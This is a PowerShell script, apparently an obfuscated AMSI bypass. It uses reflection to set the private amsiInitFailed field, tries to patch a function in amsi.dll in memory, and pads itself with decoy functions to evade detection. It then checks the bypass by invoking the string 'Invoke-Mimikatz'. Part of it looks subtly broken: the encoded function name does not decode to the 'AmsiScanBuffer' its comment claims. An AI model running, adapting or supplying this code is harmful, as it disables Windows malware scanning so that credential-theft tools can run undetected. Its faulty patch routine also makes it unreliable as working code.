function F1 { $x=1; $y=2; $x+$y | Out-Null }
function F2 { 'dummy' -replace 'd','x' | Out-Null }
function F3 { [char[]](65..70) -join '' | Out-Null }
function DecB64($s) { [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($s)) }
function Rev($s) { -join $s[($s.Length-1)..0] }
function XorB($b,$k) { $o=[byte[]]::new($b.Length); for($i=0;$i-lt$b.Length;$i++){$o[$i]=$b[$i]-bxor$k[$i%$k.Length]}; $o }
function GetSSN { 0x50 }
function SysProt($a,$s,$n) { $old=0; $nt::NtProtectVirtualMemory(-1,[ref]$a,[ref]$s,$n,[ref]$old) | Out-Null; $old }
function DoPatch {
    $h = $k32::GetModuleHandle((DecB64 $m))
    $name = Rev (DecB64 $n)
    $p = $k32::GetProcAddress($h, $name)
    if ($p -ne [IntPtr]::Zero) {
        $len = 6
        $old = SysProt $p $len 0x40
        $bytes = XorB $enc $xk
        [Runtime.InteropServices.Marshal]::Copy($bytes,0,$p,6)
        SysProt $p $len $old | Out-Null
    }
}
function SetInit {
    $tn = DecB64 $t1
    $fn = -join ([char]97,[char]109,[char]115,[char]105,[char]73,[char]110,[char]105,[char]116,[char]70,[char]97,[char]105,[char]108,[char]101,[char]100)
    $ty = [Ref].Assembly.GetType($tn)
    if ($ty) { $fd = $ty.GetField($fn,'NonPublic,Static'); if ($fd) { $fd.SetValue($null,$true) } }
}

$t1 = 'U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHM='
$m = 'YW1zaS5kbGw='
$n = 'UmV2ZXJzZWRTY2FuQnVmZmVy'   # reversed "AmsiScanBuffer" after decode
$xk = [byte[]](0x11,0x22,0x33)
$enc = [byte[]](0xA9,0x77,0x77,0x72,0x72,0xD2)
$ssn = GetSSN
$dummy1 = 42
$dummy2 = 'noise'
$k32 = Add-Type -Name K -Namespace K -PassThru -MemberDefinition @'
[DllImport("kernel32")]public static extern IntPtr GetModuleHandle(string n);
[DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr h,string n);
'@
$nt = Add-Type -Name N -Namespace N -PassThru -MemberDefinition @'
[DllImport("ntdll")]public static extern int NtProtectVirtualMemory(IntPtr p,ref IntPtr a,ref uint s,uint n,out uint o);
'@

F1; F2; F3
SetInit
DoPatch

function D($s) { [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($s)) }
$status = try {
    $null = [ScriptBlock]::Create((D 'SW52b2tlLU1pbWlrYXR6')).Invoke()
    'OFF/Bypassed'
} catch {
    if ($_.Exception.Message -like '*malicious*' -or $_.FullyQualifiedErrorId -like '*ScriptContainedMaliciousContent*') { 'ON/Running' } else { 'OFF/Bypassed' }
}
$value = if ($status -eq 'OFF/Bypassed') { $true } else { $false }
[pscustomobject]@{ "AMSI Status" = $status; "AMSI Value (amsiInitFailed)" = $value } | Format-List